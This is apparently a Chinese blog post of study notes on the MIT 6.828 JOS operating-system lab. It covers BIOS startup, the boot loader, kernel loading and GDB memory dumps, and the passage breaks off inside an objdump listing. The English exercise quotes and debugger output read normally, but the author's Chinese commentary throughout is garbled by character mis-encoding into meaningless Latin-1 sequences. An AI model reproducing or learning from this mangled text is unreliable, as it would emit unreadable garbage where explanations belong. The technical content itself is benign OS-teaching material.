è¢«â€œç¡¬è¿çº¿â€ï¼ˆhard-wiredï¼‰åˆ°ç‰©ç†åœ°å€çš„ <code>0x0000f0000 - 0x000fffff</code> å¤„ï¼ˆç‰©ç†åœ°å€èµ·å§‹ 64KBï¼‰ï¼Œè¿™ä¸ªè®¾è®¡ä¿è¯äº† BIOS åœ¨å¯åŠ¨æˆ–æ˜¯ç³»ç»Ÿé‡å¯æ—¶æ€»èƒ½æ˜¯ç¬¬ä¸€ä¸ªæ‹¿åˆ°æœºå™¨æ§åˆ¶æƒçš„ï¼Œå› ä¸ºæ­¤æ—¶ RAM ä¸­è¿˜æ²¡æœ‰ä»»ä½•å…¶ä»–çš„è½¯ä»¶å¯ä»¥è®©å¤„ç†å™¨è¿è¡Œï¼ˆç¬”è€…è®¤ä¸ºè¿™æ˜¯ä¸€å¥åºŸè¯ï¼‰ã€‚QEMU è‡ªå·±æœ‰ç€ä¸€ä¸ª BIOSï¼Œåœ¨å¤„ç†å™¨å¤ä½åï¼Œå…¶å¤„åœ¨å®æ¨¡å¼ä¸‹ï¼Œä¸”ä¼šå°† <code>CS:IP</code> è®¾ç½®ä¸º <code>0xf000:0xfff0</code>ï¼Œå› æ­¤ PC ä»æ­¤å¤„çš„ä»£ç å¼€å§‹æ‰§è¡Œâ€”â€”å°† CS å¯„å­˜å™¨å·¦ç§» 4 ä½å†åŠ ä¸Š IP å¯„å­˜å™¨ä¾¿è·å¾—äº†å½“å‰æ‰§è¡Œçš„ä»£ç çš„åœ°å€ <code>0xffff0</code>â€”â€”20ä½çš„åœ°å€çº¿æ’‘èµ·äº† 1MB çš„å†…å­˜ç©ºé—´ã€‚</p><blockquote><p>å½“ç¬”è€…ç¿»è¯‘å®Œ MIT å®éªŒé¡µé¢çš„è¿™ä¸€æ®µè¯ä¹‹åå‘ç°è¿™å®Œå…¨æ²¡æœ‰ä»»ä½•æ„ä¹‰â€”â€”å¯¹äºäºŒè¿›åˆ¶äººæ¥è¯´è¿™æ˜¯å†åŸºç¡€ä¸è¿‡çš„çŸ¥è¯†äº†ï¼Œå› æ­¤åé¢åªä¼šé…Œæƒ…å¼•å…¥ MIT å®éªŒæ–‡æ¡£çš„ç¿»è¯‘ï¼Œæ›´å¤šçš„æ˜¯ç¬”è€…è‡ªå·±è®¤ä¸ºæœ‰å¿…è¦å†™ä¸‹çš„ç¬”è®°ï¼Œä¾‹å¦‚ä¸Šé¢çš„è¿™ä¸€æ®µè¯çš„æœ«å°¾éƒ¨åˆ†ä¾¿æ˜¯ç¬”è€…è‡ªå·±å†™çš„ã€‚</p></blockquote><p>æ¥ä¸‹æ¥çœ‹ Exercise 2ï¼Œä¸»è¦æ˜¯è®©æˆ‘ä»¬å°è¯•è·Ÿè¿›è°ƒè¯•ä¸€ä¸‹ BIOSï¼Œæ„Ÿå—ä¸€ä¸‹ä»–ä¼šåšäº›ä»€ä¹ˆï¼š</p><blockquote><p>Exercise 2. Use GDBâ€™s si (Step Instruction) command to trace into the ROM BIOS for a few more instructions, and try to guess what it might be doing. You might want to look at <a href="http://web.archive.org/web/20040404164813/members.iweb.net.au/~pstorr/pcbook/book2/book2.htm">http://web.archive.org/web/20040404164813/members.iweb.net.au/~pstorr/pcbook/book2/book2.htm</a>, as well as other materials on the <a href="https://pdos.csail.mit.edu/6.828/2018/reference.html">6.828 reference materials page</a>. No need to figure out all the details - just the general idea of what the BIOS is doing first.</p></blockquote><p>BIOS ä¸»è¦å®Œæˆçš„å·¥ä½œä¾¿æ˜¯è®¾ç½®ä¸­æ–­å‘é‡è¡¨ï¼ˆInterrupt Vector Tableï¼Œä½äº <code>0x000 ~ 0x3fff</code>ï¼‰ï¼Œåˆå§‹åŒ–ä¸€äº›è®¾å¤‡ï¼ˆä¾‹å¦‚ VGA displayï¼‰ï¼Œæ­¤æ—¶æ˜¾å­˜è¢«æ˜ å°„åˆ° <code>0xa0000 ~ 0xbffff</code>ï¼Œæ˜¾ç¤ºé€‚é…å™¨çš„ BIOS è¢«åŠ è½½åˆ° <code>0xc0000 ~ 0xc7fff</code>ï¼Œæ­¤æ—¶<strong>æˆ‘ä»¬ç›´æ¥å‘æ˜¾å­˜æ˜ å°„åŒºå†™å…¥å†…å®¹ä¾¿å¯ä»¥åœ¨å±å¹•ä¸Šæ˜¾ç¤ºå­—ç¬¦</strong></p><p>ä¹‹å BIOS ä¼šè¯»å‡ºç¡¬ç›˜ä¸Šçš„<strong>ç¬¬ä¸€ä¸ªæ‰‡åŒº</strong>åˆ° <code>0x7c00</code> å¤„ï¼Œ<strong>å¹¶è·³è½¬åˆ°è¯¥å¤„</strong>ï¼Œæˆ‘ä»¬ç§°è¢«è½½å…¥çš„ç¬¬ä¸€ä¸ªæ‰‡åŒºä¸º<strong>ä¸»å¼•å¯¼è®°å½•</strong>ï¼ˆMaster Boot Record, aka MBRï¼‰ï¼Œå…¶ä» BIOS æ‰‹ä¸­æ¥è¿‡å¯åŠ¨ PC çš„æ¥åŠ›æ£’</p><blockquote><p>MIT åŸå®éªŒæ–‡æ¡£ä¸­å†™çš„æ˜¯ BIOS å°†ä¸­æ–­æè¿°ç¬¦è¡¨ï¼ˆInterrupt Descriptor Tableï¼‰è½½å…¥åˆ°å†…å­˜å½“ä¸­ï¼Œä½†ç¬”è€…è®¤ä¸ºåœ¨<strong>å®æ¨¡å¼ä¸‹åº”å½“ä¸ºä¸­æ–­å‘é‡è¡¨</strong>ï¼Œè¿™æ˜¯å› ä¸ºä¸­æ–­æè¿°ç¬¦æ˜¯ä¸€ä¸ªå±äºä¿æŠ¤æ¨¡å¼ä¸‹çš„æ¦‚å¿µï¼Œè¿™é‡Œåšå‡ºæ”¹æ­£</p></blockquote><h2 id="Part-2-The-Boot-Loader"><a href="#Part-2-The-Boot-Loader" class="headerlink" title="Part 2: The Boot Loader"></a>Part 2: The Boot Loader</h2><p>é€šå¸¸ PC çš„ç¡¬ç›˜ä¸è½¯ç›˜ä¸Šçš„ç©ºé—´è¢«æŒ‰ç…§ <code>æ‰‡åŒº</code> è¿›è¡Œåˆ’åˆ†ï¼Œæœ€å¸¸è§çš„æ‰‡åŒºå¤§å°ä¸º <code>512B</code>ï¼Œå•ä¸ªæ‰‡åŒºä¹Ÿæ˜¯æˆ‘ä»¬è¯»å†™ç£ç›˜æœ€å°çš„æ“ä½œå•ä½ï¼Œè‹¥ç£ç›˜æ˜¯å¯å¼•å¯¼çš„ï¼Œåˆ™ç¬¬ä¸€ä¸ªæ‰‡åŒºç§°ä¸º<strong>å¼•å¯¼æ‰‡åŒº</strong>ï¼Œå› ä¸ºè¯¥æ‰‡åŒºä¸­å­˜æ”¾ç€ <em>å¼•å¯¼åŠ è½½ç¨‹åº</em> çš„ä»£ç ï¼ŒBIOS åœ¨ PC å¯åŠ¨åå®Œæˆå…¶å·¥ä½œåä¼šå°†è¯¥æ‰‡åŒºè¯»åˆ°å†…å­˜ä¸­çš„ <code>0x7c00 ~ 0x7fff</code> å¤„ï¼Œä¹‹åä½¿ç”¨ä¸€ä¸ª <code>jmp</code> è·³è½¬æŒ‡ä»¤è·³è½¬è‡³ <code>CS:IP = 0000:7C00</code>ï¼Œå°†æ§åˆ¶æƒäº¤ç»™è¿™ä¸€éƒ¨åˆ†ä»£ç </p><blockquote><p>MIT æ–‡æ¡£è®¤ä¸ºï¼Œè¿™ä¸ªåœ°å€æ˜¯ç›¸å½“éšæ„çš„ï¼Œ<strong>ä½†ç»ç¬”è€…è€ƒè¯è¿™æ˜¯ä¸€ä¸ªæœ‰æ¥å¤´çš„åœ°å€</strong>ï¼Œå‚è§<a href="https://arttnba3.cn/2021/06/24/CODE-0X00-A3OS/#%E4%B8%80%E3%80%81%E5%AE%9E%E6%A8%A1%E5%BC%8F%E4%B8%8B%E7%9A%84%E5%86%85%E5%AD%98%E5%B8%83%E5%B1%80">ã€CODE.0x00ã€‘ä»é›¶å¼€å§‹çš„32ä½æ“ä½œç³»ç»Ÿå¼€å‘æ‰‹è®° - arttnba3â€™s blog</a></p></blockquote><p>ç”±äº CD-ROM çš„å‡ºç°åœ¨ PC å‘å±•å²ä¸­è¾ƒæ™šï¼Œè¿™ç»™äº† PC æ¶æ„å¸ˆè¶³å¤Ÿçš„æ—¶é—´å»é‡æ–°æ€è€ƒå¹¶è®¾è®¡åŠŸèƒ½æ›´åŠ å¼ºå¤§çš„å¼•å¯¼æ–¹å¼ï¼ŒCD-ROM é€šå¸¸ä½¿ç”¨ <code>2048B</code> çš„æ‰‡åŒºå¤§å°ï¼Œä¸” BIOS ä¼šå°†æ›´å¤šçš„æ‰‡åŒºä½œä¸ºå¼•å¯¼æ˜ åƒè½½å…¥å†…å­˜ä¸­ï¼Œè¿™éƒ¨åˆ†å†…å®¹å¯ä»¥å‚è§<a href="https://pdos.csail.mit.edu/6.828/2018/readings/boot-cdrom.pdf">â€œEl Toritoâ€ Bootable CD-ROM Format Specification</a></p><p>6.828 çš„ boot loader åŒ…å«ä¸¤ä¸ªæ–‡ä»¶ï¼š<code>boot/boot.S</code> ä¸ <code>boot/main.c</code>ï¼Œå…¶å®Œæˆä»¥ä¸‹ä¸¤ä¸ªå·¥ä½œï¼š</p><ul><li><p>å°†å¤„ç†å™¨<strong>ä»å®æ¨¡å¼åˆ‡æ¢åˆ°ä¿æŠ¤æ¨¡å¼</strong>ï¼ˆboot.Sï¼‰</p><ul><li><p>æ‰“å¼€ A20-Gate ä»¥æ”¯æŒå¤§äº 1MB çš„åœ°å€ç©ºé—´</p></li><li><p>åŠ è½½å…¨å±€æ®µæè¿°ç¬¦è¡¨</p></li><li><p>è®¾ç½® cr0 å¯„å­˜å™¨å¯¹åº”æ ‡å¿—ä½ï¼Œè¿›å…¥ä¿æŠ¤æ¨¡å¼</p></li></ul></li><li><p>é€šè¿‡ x86 çš„ç‰¹æ®Š I&#x2F;O æŒ‡ä»¤ä»ç£ç›˜ä¸Šè¯»å–å†…æ ¸å¹¶å°†ä¹‹è½½å…¥å†…å­˜ï¼Œè·³è½¬åˆ°å†…æ ¸ï¼ˆboot.cï¼‰</p><ul><li><p>é€šè¿‡ <code>in</code> ä¸ <code>out</code> è¿™ä¸¤æ¡æŒ‡ä»¤è¯»å–ç£ç›˜æ•°æ®</p></li><li><p>æ£€æŸ¥å¹¶åˆ†æ ELF headerï¼Œè·³è½¬åˆ°å†…æ ¸</p></li></ul></li></ul><p>åœ¨å¤§äºŒä¸‹å­¦ä¹ æ“ä½œç³»ç»Ÿè¯¾ç¨‹æ—¶ç¬”è€…æœ‰å¹¸å°è¯•äº²æ‰‹å†™è¿‡ä¸€ä¸ªå†…æ ¸ï¼ˆè™½ç„¶è¿œæ²¡æœ‰å®Œæˆï¼‰ï¼Œå…¶ä¸­å°±åŒ…æ‹¬å†™ loaderï¼Œå› æ­¤è¿™ä¸€éƒ¨åˆ†ç¬”è€…è¿˜æ˜¯ç›¸å¯¹è¾ƒä¸ºç†Ÿæ‚‰çš„ï¼Œä¸è¿‡ MIT ä»£ç çš„ç²¾ç‚¼ç¨‹åº¦è¿œéç¬”è€…ä» <em>å¦ä¸€æœ¬ä¹¦ä¸ŠæŠ„æŠ„æ”¹æ”¹è€Œæ¥çš„ä»£ç </em> æ‰€èƒ½æ¯”æ‹Ÿçš„ï¼Œæ¨èå¤§å®¶ä»”ç»†é˜…è¯»ï¼ˆç¬‘ï¼‰</p><p>ä¸‹é¢çœ‹ Exercise 3ï¼Œä¸»è¦æ˜¯å‚ç…§ 6.828 çš„æ‰‹å†Œå­¦ä¹  GDBï¼Œè¿™é‡Œå°±ä¸è´´è¿‡ç¨‹äº†ï¼š</p><blockquote><p>Exercise 3.Â Take a look at the <a href="https://pdos.csail.mit.edu/6.828/2018/labguide.html">lab tools guide</a>, especially the section on GDB commands. Even if youâ€™re familiar with GDB, this includes some esoteric GDB commands that are useful for OS work.</p><p>Set a breakpoint at address 0x7c00, which is where the boot sector will be loaded. Continue execution until that breakpoint. Trace through the code inÂ boot&#x2F;boot.S, using the source code and the disassembly fileÂ obj&#x2F;boot&#x2F;boot.asmÂ to keep track of where you are. Also use theÂ x&#x2F;iÂ command in GDB to disassemble sequences of instructions in the boot loader, and compare the original boot loader source code with both the disassembly inÂ obj&#x2F;boot&#x2F;boot.asmÂ and GDB.</p><p>Trace intoÂ bootmain()Â inÂ boot&#x2F;main.c, and then intoÂ readsect(). Identify the exact assembly instructions that correspond to each of the statements inÂ readsect(). Trace through the rest ofÂ readsect()Â and back out intoÂ bootmain(), and identify the begin and end of theÂ forÂ loop that reads the remaining sectors of the kernel from the disk. Find out what code will run when the loop is finished, set a breakpoint there, and continue to that breakpoint. Then step through the remainder of the boot loader.</p></blockquote><p>6.828 è¿˜æä¾›ç»™æˆ‘ä»¬ä¸€ä»½åç¼–è¯‘åçš„ loader æ–‡ä»¶ï¼Œä½äº <code>obj/boot/boot.asm</code>ï¼Œä¸ºä¸Šé¢ä¸¤ä¸ªæ–‡ä»¶ç¼–è¯‘ååœ¨å†…å­˜ä¸­çš„æ ·å­ï¼Œå¹¶é™„ä¸Šäº†è´´å¿ƒçš„æ³¨é‡Šï¼Œæ¨èå¤§å®¶é…åˆç€è¿™ä»½æ–‡ä»¶è¿›è¡Œè°ƒè¯•ï¼Œ<strong>æè‡´äº«å—</strong>ï¼ˆç¬‘ï¼‰</p><p><img src="https://s2.loli.net/2022/02/20/pGUmRero8DqvH5j.png" alt="imagepng"></p><p>æ¥ä¸‹æ¥è§£å†³ä¸€äº› 6.828 çš„ä¹ é¢˜ï¼š</p><ul><li><p>At what point does the processor start executing 32-bit code? What exactly causes the switch from 16- to 32-bit mode?</p><ul><li><p>åœ¨ <code>boot.main.c</code> ä¸­çš„ bootmain() ä¸­é€šè¿‡ <code>((void (*)(void)) (ELFHDR-&gt;e_entry))();</code> è·³è½¬åˆ°å†…æ ¸å…¥å£ç‚¹</p></li><li><p>å½“ MBR è®¾ç½®äº† cr0 å¯„å­˜å™¨çš„ <code>PE</code> æ ‡å¿—ä½åï¼Œå¤„ç†å™¨ä»å®æ¨¡å¼è¿›å…¥åˆ°ä¿æŠ¤æ¨¡å¼ï¼Œå¯¹åº”çš„æ±‡ç¼–ä»£ç ä¸º <code>ljmp $0x8,$0x7c32</code>ï¼Œ<strong>è¿™æ˜¯åœ¨åŠ è½½äº†å…¨å±€æ®µæè¿°ç¬¦è¡¨åä½¿ç”¨ä»£ç æ®µæè¿°ç¬¦å®Œæˆçš„ä¸€ä¸ªè·³è½¬æŒ‡ä»¤</strong></p><p><img src="https://s2.loli.net/2022/02/20/bDBS7YIQpKEAlqJ.png" alt="imagepng"></p></li></ul></li><li><p>What is the <em>last</em> instruction of the boot loader executed, and what is the <em>first</em> instruction of the kernel it just loaded?</p><ul><li><p>boot loader æ‰§è¡Œçš„æœ€åä¸€æ¡æŒ‡ä»¤ä¸º<code>((void (*)(void)) (ELFHDR-&gt;e_entry))();</code>ï¼Œå¯¹åº”æ±‡ç¼–ä»£ç  <code>call *0x10018</code>â€”â€”è¿™æ˜¯ kernel çš„å…¥å£ç‚¹ï¼Œè€Œ kernel æ‰§è¡Œçš„ç¬¬ä¸€æ¡æŒ‡ä»¤ä¸º <code>movw $0x1234, 0x472</code></p><p><img src="https://s2.loli.net/2022/02/20/DHyfhqPj7NgbsT6.png" alt="imagepng"></p></li></ul></li><li><p><em>Where</em> is the first instruction of the kernel?</p><ul><li>kernel çš„ç¬¬ä¸€æ¡æŒ‡ä»¤åœ¨å…¶ ELF å…¥å£ç‚¹æ ‡æ³¨çš„ä½ç½®ï¼Œè¿™é‡Œæ˜¯ <code>0x10018</code></li></ul></li><li><p>How does the boot loader decide how many sectors it must read in order to fetch the entire kernel from disk? Where does it find this information?</p><ul><li>loader é¦–å…ˆä¼šä»ç£ç›˜ä¸Šè¯»å–å‰é¢ä¸€å¼ é¡µçš„å†…å®¹ï¼ˆå¤§å°0x1000ï¼‰ï¼Œåœ¨åˆ¤æ–­è¿™æ˜¯ä¸€ä¸ªåˆæ³•çš„ ELF header ä¹‹åè§£æå…¶èŠ‚è¡¨ï¼ˆå…¶ä¸­åŒ…å«æ¯ä¸€èŠ‚ï¼ˆsectionï¼Œä¹Ÿç§°æ®µï¼ˆsegmentï¼‰ï¼‰çš„ç›¸å…³ä¿¡æ¯ï¼ŒåŒ…æ‹¬è¯¥æ®µåœ¨æ–‡ä»¶å†…çš„åç§»ï¼ˆp_offsetï¼‰ã€åœ¨å†…å­˜ä¸­çš„åŠ è½½åœ°å€ï¼ˆp_vaddrï¼‰ã€åœ¨æ–‡ä»¶ä¸­çš„å¤§å°ï¼ˆp_fileszï¼‰ã€è¯¥æ®µåœ¨å†…å­˜ä¸­çš„å¤§å°ï¼ˆp_memszï¼‰ã€è¯¥æ®µçš„æ ‡å¿—ä½ï¼ˆp_flagsï¼Œä¸»è¦æ ‡è¯† rwx æƒé™ï¼‰ï¼‰ï¼Œæ ¹æ®èŠ‚è¡¨ä¿¡æ¯ä»ç£ç›˜ä¸Šè¯»å–æ•°æ®</li></ul></li></ul><h3 id="Loading-the-Kernel"><a href="#Loading-the-Kernel" class="headerlink" title="Loading the Kernel"></a>Loading the Kernel</h3><p>é¦–å…ˆçœ‹ Exercise 4ï¼Œä¸»è¦æ˜¯<strong>å¤ä¹ </strong>ä½ çš„ C è¯­è¨€çŸ¥è¯†ï¼Œå°¤å…¶æ˜¯å…³äºæŒ‡é’ˆçš„é‚£ä¸€éƒ¨åˆ†ï¼ˆç¬‘ï¼‰ï¼Œè¿™ä¸€å—å¯ä»¥å‚è€ƒå¤§åé¼é¼çš„ K&amp;R Cï¼Œä»¥åŠè£…è½½é“¾æ¥ELFæ–‡ä»¶ç­‰åŸºç¡€çŸ¥è¯†ï¼Œç¬”è€…æ¨èé˜…è¯»ã€Šç¨‹åºå‘˜çš„è‡ªæˆ‘ä¿®å…»ã€‹</p><blockquote><p>Exercise 4.Â Read about programming with pointers in C. The best reference for the C language is <em>The C Programming Language</em> by Brian Kernighan and Dennis Ritchie (known as â€˜K&amp;Râ€™). We recommend that students purchase this book (here is an <a href="http://www.amazon.com/C-Programming-Language-2nd/dp/0131103628/sr=8-1/qid=1157812738/ref=pd_bbs_1/104-1502762-1803102?ie=UTF8&s=books">Amazon Link</a>) or find one of <a href="http://library.mit.edu/F/AI9Y4SJ2L5ELEE2TAQUAAR44XV5RTTQHE47P9MKP5GQDLR9A8X-10422?func=item-global&doc_library=MIT01&doc_number=000355242&year=&volume=&sub_library=">MITâ€™s 7 copies</a>.</p><p>Read 5.1 (Pointers and Addresses) through 5.5 (Character Pointers and Functions) in K&amp;R. Then download the code for <a href="https://pdos.csail.mit.edu/6.828/2018/labs/lab1/pointers.c">pointers.c</a>, run it, and make sure you understand where all of the printed values come from. In particular, make sure you understand where the pointer addresses in printed lines 1 and 6 come from, how all the values in printed lines 2 through 4 get there, and why the values printed in line 5 are seemingly corrupted.</p><p>There are other references on pointers in C (e.g., <a href="https://pdos.csail.mit.edu/6.828/2018/readings/pointers.pdf">A tutorial by Ted Jensen</a> that cites K&amp;R heavily), though not as strongly recommended.</p><p><em>Warning:</em> Unless you are already thoroughly versed in C, do not skip or even skim this reading exercise. If you do not really understand pointers in C, you will suffer untold pain and misery in subsequent labs, and then eventually come to understand them the hard way. Trust us; you donâ€™t want to find out what â€œthe hard wayâ€ is.</p></blockquote><p>æ¥ä¸‹æ¥æ˜¯ Exercise 5ï¼Œä¸»è¦æ˜¯æ”¹ Makefile æ–‡ä»¶ä¸­æŒ‡å®šçš„é“¾æ¥åœ°å€ç„¶åé‡æ–°è°ƒè¯•ä½“éªŒä¸€ä¸‹ï¼Œè¿™é‡Œå°±è·³è¿‡äº†</p><blockquote><p>Exercise 5. Trace through the first few instructions of the boot loader again and identify the first instruction that would â€œbreakâ€ or otherwise do the wrong thing if you were to get the boot loaderâ€™s link address wrong. Then change the link address in boot&#x2F;Makefrag to something wrong, run make clean, recompile the lab with make, and trace into the boot loader again to see what happens. Donâ€™t forget to change the link address back and make clean again afterward!</p></blockquote><p>æœ€åæ˜¯ Exercise 6ï¼Œä½¿ç”¨ GDB æŒ‡ä»¤åœ¨ BIOS å°†æ§åˆ¶æƒäº¤ç»™ MBR æ—¶æŸ¥çœ‹å†…å­˜ <code>0x00100000</code> å¤„çš„æ•°æ®</p><blockquote><p>Exercise 6.Â We can examine memory using GDBâ€™sÂ xÂ command. The <a href="https://sourceware.org/gdb/current/onlinedocs/gdb/Memory.html">GDB manual</a> has full details, but for now, it is enough to know that the commandÂ x&#x2F;<em>N</em>x <em>ADDR</em> prints <em>N</em> words of memory at <em>ADDR</em>. (Note that both â€˜xâ€™s in the command are lowercase.) <em>Warning</em>: The size of a word is not a universal standard. In GNU assembly, a word is two bytes (the â€˜wâ€™ in xorw, which stands for word, means 2 bytes).</p><p>Reset the machine (exit QEMU&#x2F;GDB and start them again). Examine the 8 words of memory at 0x00100000 at the point the BIOS enters the boot loader, and then again at the point the boot loader enters the kernel. Why are they different? What is there at the second breakpoint? (You do not really need to use QEMU to answer this question. Just think.)</p></blockquote><p>è™½ç„¶è¦æ±‚åªçœ‹ 8 ä¸ª wordï¼Œä½†æ˜¯ç¬”è€…è¿˜æ˜¯ä¹ æƒ¯å¤šçœ‹ä¸€äº›ï¼ˆç¬‘ï¼‰ï¼Œè¿™é‡Œå¯ä»¥çœ‹åˆ°åœ¨åˆšåˆšè¿è¡Œåˆ° MBR æ—¶è¯¥å¤„æ•°æ®éƒ½æ˜¯0</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line">The target architecture is set to &quot;i8086&quot;.</span><br><span class="line">[f000:fff0]    0xffff0:    ljmp   $0xf000,$0xe05b</span><br><span class="line">0x0000fff0 in ?? ()</span><br><span class="line">+ symbol-file obj/kern/kernel</span><br><span class="line">(gdb) x /20gx 0x00100000 </span><br><span class="line">0x100000:    0x0000000000000000    0x0000000000000000</span><br><span class="line">0x100010:    0x0000000000000000    0x0000000000000000</span><br><span class="line">0x100020:    0x0000000000000000    0x0000000000000000</span><br><span class="line">0x100030:    0x0000000000000000    0x0000000000000000</span><br><span class="line">0x100040:    0x0000000000000000    0x0000000000000000</span><br><span class="line">0x100050:    0x0000000000000000    0x0000000000000000</span><br><span class="line">0x100060:    0x0000000000000000    0x0000000000000000</span><br><span class="line">0x100070:    0x0000000000000000    0x0000000000000000</span><br><span class="line">0x100080:    0x0000000000000000    0x0000000000000000</span><br><span class="line">0x100090:    0x0000000000000000    0x0000000000000000</span><br><span class="line">(gdb) b *0x7c00</span><br><span class="line">Breakpoint 1 at 0x7c00</span><br><span class="line">(gdb) c</span><br><span class="line">Continuing.</span><br><span class="line">[   0:7c00] =&gt; 0x7c00:    cli    </span><br><span class="line"></span><br><span class="line">Breakpoint 1, 0x00007c00 in ?? ()</span><br><span class="line">(gdb) x /20gx 0x00100000 </span><br><span class="line">0x100000:    0x0000000000000000    0x0000000000000000</span><br><span class="line">0x100010:    0x0000000000000000    0x0000000000000000</span><br><span class="line">0x100020:    0x0000000000000000    0x0000000000000000</span><br><span class="line">0x100030:    0x0000000000000000    0x0000000000000000</span><br><span class="line">0x100040:    0x0000000000000000    0x0000000000000000</span><br><span class="line">0x100050:    0x0000000000000000    0x0000000000000000</span><br><span class="line">0x100060:    0x0000000000000000    0x0000000000000000</span><br><span class="line">0x100070:    0x0000000000000000    0x0000000000000000</span><br><span class="line">0x100080:    0x0000000000000000    0x0000000000000000</span><br><span class="line">0x100090:    0x0000000000000000    0x0000000000000000</span><br><span class="line">(gdb) </span><br></pre></td></tr></table></figure><p>æ¥ä¸‹æ¥åœ¨è¿›å…¥å†…æ ¸æ—¶å†æ¬¡æŸ¥çœ‹æ­¤å¤„æ•°æ®ï¼Œå‘ç°å·²ç»è¢«è¦†ç›–ä¸Šäº†æ–°çš„æ•°æ®ï¼Œä¸»è¦æ˜¯å†…æ ¸çš„æ±‡ç¼–ä»£ç </p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">Breakpoint 1, 0x00007d81 in ?? ()</span><br><span class="line">(gdb) x /20gx 0x00100000 </span><br><span class="line">0x100000:    0x000000001badb002    0x7205c766e4524ffe</span><br><span class="line">0x100010:    0x2000b81234000004    0xc0200fd8220f0011</span><br><span class="line">0x100020:    0xc0220f800100010d    0xbde0fff010002fb8</span><br><span class="line">0x100030:    0x110000bc00000000    0xfeeb0000006ce8f0</span><br><span class="line">0x100040:    0x56e58955fb1e0ff3    0xc3810000017ee853</span><br><span class="line">0x100050:    0x8308758b000112ba    0xff0778838d5608ec</span><br><span class="line">0x100060:    0x8300000a03e850ff    0xec83297ef68510c4</span><br><span class="line">0x100070:    0xffc6e850ff468d0c    0x08ec8310c483ffff</span><br><span class="line">0x100080:    0x50ffff0794838d56    0x10c483000009dde8</span><br><span class="line">0x100090:    0x83c35d5e5bf8658d    0x006a006a006a04ec</span><br><span class="line">(gdb) </span><br></pre></td></tr></table></figure><p>è¿™é‡Œæˆ‘ä»¬æ³¨æ„åˆ°ä¸€ä¸ªæ•°å­—<code>0x1badb002</code>â€”â€”<strong>è¿™æ˜¯ Multiboot Specification æ ‡å‡†è¦æ±‚çš„ä¸€ä¸ªä½äº header çš„ magic number</strong>ï¼Œåœ¨å¯åŠ¨æ—¶ä¼šæ ¡éªŒè¿™ä¸ªæ•°ï¼Œè¯¦æƒ…å¯ä»¥å‚è§ <a href="https://www.gnu.org/software/grub/manual/multiboot/multiboot.html">https://www.gnu.org/software/grub/manual/multiboot/multiboot.html</a></p><h2 id="Part-3-The-Kernel"><a href="#Part-3-The-Kernel" class="headerlink" title="Part 3: The Kernel"></a>Part 3: The Kernel</h2><p>åœ¨æœ¬éƒ¨åˆ†ä¸­æˆ‘ä»¬å°†å¼€å§‹å­¦ä¹  JOS çš„æœ€å°å®ç°çš„ç»†èŠ‚ï¼Œå¹¶<strong>å¼€å§‹å†™ä¸€äº›ä»£ç </strong>ã€‚å¦‚åŒ boot loader ä¸€èˆ¬ï¼Œå†…æ ¸åœ¨ä¸€å¼€å§‹ä¹Ÿå…ˆæ‰§è¡Œä¸€äº›æ±‡ç¼–ä»£ç ï¼Œä»¥è®© C ä»£ç èƒ½æ°å½“åœ°æ‰§è¡Œ</p><h3 id="Using-virtual-memory-to-work-around-position-dependence"><a href="#Using-virtual-memory-to-work-around-position-dependence" class="headerlink" title="Using virtual memory to work around position dependence"></a>Using virtual memory to work around position dependence</h3><p>MBR çš„é“¾æ¥åœ°å€äºåŠ è½½åœ°å€å®Œå…¨åŒ¹é…ï¼Œå› ä¸ºå…¶è¿è¡Œåœ¨å®æ¨¡å¼ä¸‹ï¼Œ<del>ä»–çš„ä¸€åˆ‡éƒ½å¾ˆçœŸï¼å®æ¨¡å¼ä¸»æ‰“çš„å°±æ˜¯çœŸå®ï¼</del>ï¼Œä½†å†…æ ¸çš„åŠ è½½åœ°å€ä¸é“¾æ¥åœ°å€å´å­˜åœ¨<strong>ç›¸å½“å¤§çš„å·®åˆ«ï¼ŒOS æ›´å€¾å‘äºè¢«é“¾æ¥åˆ°ä¸€ä¸ªæ›´é«˜çš„è™šæ‹Ÿåœ°å€ä¸Šè¿è¡Œï¼Œä½†å…¶å®é™…åˆ™ä½äºç‰©ç†ä½åœ°å€</strong></p><p>æ¥ä¸‹æ¥æˆ‘ä»¬ä½¿ç”¨ <code>objdump</code> æŸ¥çœ‹ç¼–è¯‘å‡ºçš„å†…æ ¸ ELF æ–‡ä»¶æ¥éªŒè¯è¿™ä¸ªç»“è®ºï¼Œç»“æœå¦‚ä¸‹ï¼š</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_">$ </span><span class="language-bash">objdump -h ./obj/kern/kernel</span></span><br><span class="line"></span><br><span class="line">./obj/kern/kernel:     file format elf32-i386</span><br><span class="line"></span><br><span class="line">Sections:</span><br><span class="line">Idx Name          Size      VMA       LMA       File off  Algn</span><br><span class="line">  0 .text         00001a7f  f0100000  00100000  00001000  2**4</span><br><span 